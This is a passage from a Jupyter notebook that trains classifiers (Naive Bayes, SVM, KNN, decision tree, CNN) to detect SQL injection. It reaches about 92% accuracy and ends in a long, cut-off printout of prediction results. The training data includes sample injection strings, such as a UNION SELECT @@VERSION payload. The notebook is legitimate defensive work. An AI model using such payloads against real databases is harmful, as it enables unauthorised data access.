      "text/plain": [
       "(' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " 1)"
      ]
     },
     "execution_count": 93,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "values[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [],
   "source": [
    "# convert to dataframe\n",
    "\n",
    "df=pd.DataFrame(values,columns=['Sentence','Label'])\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>Label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>select * from users where id = 1 or  ( \\ )  =...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>select * from users where id = 1 or  ( \\. )  ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>select * from users where id = 1 or  ( \\+ )  ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>select * from users where id = 1 or  ( 1 )  =...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>select * from users where id = 1 or  ( \\+ )  ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            Sentence  Label\n",
       "0   select * from users where id = 1 or  ( \\ )  =...      1\n",
       "1   select * from users where id = 1 or  ( \\. )  ...      1\n",
       "2   select * from users where id = 1 or  ( \\+ )  ...      1\n",
       "3   select * from users where id = 1 or  ( 1 )  =...      1\n",
       "4   select * from users where id = 1 or  ( \\+ )  ...      1"
      ]
     },
     "execution_count": 95,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Save data as csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv('sqli.csv', index=False, encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.read_csv('sqli.csv',encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [],
   "source": [
    "# vectorization of data\n",
    "\n",
    "from sklearn.feature_extraction.text import CountVectorizer\n",
    "vectorizer = CountVectorizer( min_df=2, max_df=0.7, max_features=4096, stop_words=stopwords.words('english'))\n",
    "posts = vectorizer.fit_transform(df['Sentence'].values.astype('U')).toarray()\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(5437, 4096)"
      ]
     },
     "execution_count": 99,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "posts.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [],
   "source": [
    "posts.shape=(5437,64,64,1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(5437, 64, 64, 1)"
      ]
     },
     "execution_count": 101,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "posts.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [],
   "source": [
    "X=posts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [],
   "source": [
    "y=df['Label']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.model_selection import train_test_split"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [],
   "source": [
    "# split train test data\n",
    "\n",
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [],
   "source": [
    "trainX=X_train.copy()\n",
    "trainX.shape=(X_train.shape[0],trainX.shape[1]*trainX.shape[2])\n",
    "testX=X_test.copy()\n",
    "testX.shape=(testX.shape[0],testX.shape[1]*testX.shape[2])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Naive Bayes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.naive_bayes import GaussianNB\n",
    "\n",
    "gnb = GaussianNB()\n",
    "\n",
    "gnb.fit(trainX, y_train)\n",
    "\n",
    "pred_gnb = gnb.predict(testX)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Support Vector Machine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [],
   "source": [
    "# SVM\n",
    "from sklearn.svm import SVC\n",
    "clf = SVC(gamma='auto')\n",
    "clf.fit(trainX, y_train)\n",
    "pred_svm=clf.predict(testX)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### K Nearest Neighbor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.neighbors import KNeighborsClassifier\n",
    "\n",
    "neigh = KNeighborsClassifier(n_neighbors=3)\n",
    "neigh.fit(trainX, y_train)\n",
    "\n",
    "pred_knn = neigh.predict(testX)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Decision Tree"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn import tree\n",
    "\n",
    "dt = tree.DecisionTreeClassifier()\n",
    "dt = dt.fit(trainX, y_train)\n",
    "\n",
    "pred_dt = dt.predict(testX)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(4349, 64, 64, 1)"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X_train.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### CNN"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tensorflow as tf\n",
    "from keras.models import Sequential\n",
    "from keras import layers\n",
    "from keras.preprocessing.text import Tokenizer\n",
    "from keras.wrappers.scikit_learn import KerasClassifier"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [],
   "source": [
    "model=tf.keras.models.Sequential([\n",
    "    \n",
    "    tf.keras.layers.Conv2D(64, (3,3), activation=tf.nn.relu, input_shape=(64,64,1)),\n",
    "    tf.keras.layers.MaxPooling2D(2,2),\n",
    "    \n",
    "    tf.keras.layers.Conv2D(128,(3,3), activation=tf.nn.relu),\n",
    "    tf.keras.layers.MaxPooling2D(2,2),\n",
    "    \n",
    "    tf.keras.layers.Conv2D(256,(3,3), activation='relu'),\n",
    "    tf.keras.layers.MaxPooling2D(2,2),\n",
    "    \n",
    "    tf.keras.layers.Flatten(),\n",
    "    tf.keras.layers.Dense(256, activation='relu'),\n",
    "    tf.keras.layers.Dense(128,activation='relu'),\n",
    "    tf.keras.layers.Dense(64, activation=tf.nn.relu),\n",
    "    tf.keras.layers.Dense(1, activation='sigmoid')\n",
    "])\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"sequential\"\n",
      "_________________________________________________________________\n",
      "Layer (type)                 Output Shape              Param #   \n",
      "=================================================================\n",
      "conv2d (Conv2D)              (None, 62, 62, 64)        640       \n",
      "_________________________________________________________________\n",
      "max_pooling2d (MaxPooling2D) (None, 31, 31, 64)        0         \n",
      "_________________________________________________________________\n",
      "conv2d_1 (Conv2D)            (None, 29, 29, 128)       73856     \n",
      "_________________________________________________________________\n",
      "max_pooling2d_1 (MaxPooling2 (None, 14, 14, 128)       0         \n",
      "_________________________________________________________________\n",
      "conv2d_2 (Conv2D)            (None, 12, 12, 256)       295168    \n",
      "_________________________________________________________________\n",
      "max_pooling2d_2 (MaxPooling2 (None, 6, 6, 256)         0         \n",
      "_________________________________________________________________\n",
      "flatten (Flatten)            (None, 9216)              0         \n",
      "_________________________________________________________________\n",
      "dense (Dense)                (None, 256)               2359552   \n",
      "_________________________________________________________________\n",
      "dense_1 (Dense)              (None, 128)               32896     \n",
      "_________________________________________________________________\n",
      "dense_2 (Dense)              (None, 64)                8256      \n",
      "_________________________________________________________________\n",
      "dense_3 (Dense)              (None, 1)                 65        \n",
      "=================================================================\n",
      "Total params: 2,770,433\n",
      "Trainable params: 2,770,433\n",
      "Non-trainable params: 0\n",
      "_________________________________________________________________\n"
     ]
    }
   ],
   "source": [
    "model.compile(loss='binary_crossentropy', \n",
    "              optimizer='adam', \n",
    "              metrics=['accuracy'])\n",
    "model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {},
   "outputs": [],
   "source": [
    "# import tensorflow as tf\n",
    "\n",
    "# class myCallback(tf.keras.callbacks.Callback):\n",
    "#     def on_epoch_end(self, epoch, logs={}):\n",
    "#         if(logs.get('acc')>0.98):\n",
    "#             print( \"Reached 99.8% accuracy so cancelling training!\")\n",
    "#             self.model.stop_training=True\n",
    "# callbacks = myCallback()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 1/10\n",
      "34/34 [==============================] - 43s 1s/step - loss: 0.3131 - accuracy: 0.8393 - val_loss: 0.2022 - val_accuracy: 0.8934\n",
      "Epoch 2/10\n",
      "34/34 [==============================] - 39s 1s/step - loss: 0.1718 - accuracy: 0.9071 - val_loss: 0.1714 - val_accuracy: 0.9072\n",
      "Epoch 3/10\n",
      "34/34 [==============================] - 41s 1s/step - loss: 0.1404 - accuracy: 0.9303 - val_loss: 0.1616 - val_accuracy: 0.9173\n",
      "Epoch 4/10\n",
      "34/34 [==============================] - 41s 1s/step - loss: 0.1169 - accuracy: 0.9402 - val_loss: 0.1554 - val_accuracy: 0.9182\n",
      "Epoch 5/10\n",
      "34/34 [==============================] - 42s 1s/step - loss: 0.1032 - accuracy: 0.9446 - val_loss: 0.1572 - val_accuracy: 0.9182\n",
      "Epoch 6/10\n",
      "34/34 [==============================] - 44s 1s/step - loss: 0.0904 - accuracy: 0.9494 - val_loss: 0.1733 - val_accuracy: 0.9246\n",
      "Epoch 7/10\n",
      "34/34 [==============================] - 43s 1s/step - loss: 0.0931 - accuracy: 0.9499 - val_loss: 0.1564 - val_accuracy: 0.9265\n",
      "Epoch 8/10\n",
      "34/34 [==============================] - 42s 1s/step - loss: 0.0824 - accuracy: 0.9540 - val_loss: 0.1731 - val_accuracy: 0.9256\n",
      "Epoch 9/10\n",
      "34/34 [==============================] - 40s 1s/step - loss: 0.0752 - accuracy: 0.9572 - val_loss: 0.1638 - val_accuracy: 0.9246\n",
      "Epoch 10/10\n",
      "34/34 [==============================] - 38s 1s/step - loss: 0.1136 - accuracy: 0.9448 - val_loss: 0.1574 - val_accuracy: 0.9228\n"
     ]
    }
   ],
   "source": [
    "classifier_nn = model.fit(X_train,y_train,\n",
    "                    epochs=10,\n",
    "                    verbose=True,\n",
    "                    validation_data=(X_test, y_test),\n",
    "                    batch_size=128)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {},
   "outputs": [],
   "source": [
    "pred=model.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(len(pred)):\n",
    "    if pred[i]>0.5:\n",
    "        pred[i]=1\n",
    "    elif pred[i]<=0.5:\n",
    "        pred[i]=0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.metrics import accuracy_score"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9227941176470589"
      ]
     },
     "execution_count": 120,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "accuracy_score(y_test,pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[False]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
      "[ True]\n",
